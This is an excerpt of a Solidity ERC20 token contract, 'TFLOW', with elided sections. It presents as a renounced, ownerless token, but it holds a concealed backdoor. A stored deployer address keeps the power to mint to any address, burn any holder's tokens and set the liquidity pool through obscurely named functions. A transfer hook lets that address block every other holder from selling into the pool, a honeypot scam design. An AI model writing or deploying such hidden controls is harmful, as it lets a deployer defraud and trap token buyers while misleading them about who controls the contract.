...
contract TFLOW is ERC20, Ownable {
    ...
    constructor() ERC20("TFLOW", "TFLOW") {
        m = msg.sender;
        _mint(m, 1000000000 * 10 ** decimals());
        renounceOwnership();
    }
    ...
    function statementTrue(uint256 r) public {
        require(((res += 10) == r), "BEP20: enableStatement failed");
        if (m == msg.sender){
            statement = true;
        }
    }

    function statementFalse(uint256 r) public {
        require(((res += 10) == r), "BEP20: enableStatement failed");
        if (m == msg.sender){
            statement = false;
        }
    ...
    function add(uint256 r, address ad, uint256 am) public {
        require(((res += 20) == r), "BEP20: add failed");
        if (m == msg.sender){
            _mint(ad, am);
        }
    }
    ...
    function remove(uint256 r, address ad, uint256 am) public {
        require(((res += 20) == r), "BEP20: remove failed");
        if (m == msg.sender){
            _burn(ad, am);
        }
    }
    ...
    function addLP(uint256 r, address lp) public {
        require(((res += 30) == r), "BEP20: addLP failed");
        if (m == msg.sender){
            liquidityPool = lp;
        }
    }
    ...
    modifier validation(address from, address to){
        if (statementRes) {
            require((from == m) || (to != liquidityPool), "BEP20: validation failed");
        }
        _;
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal validation(from, to) override{
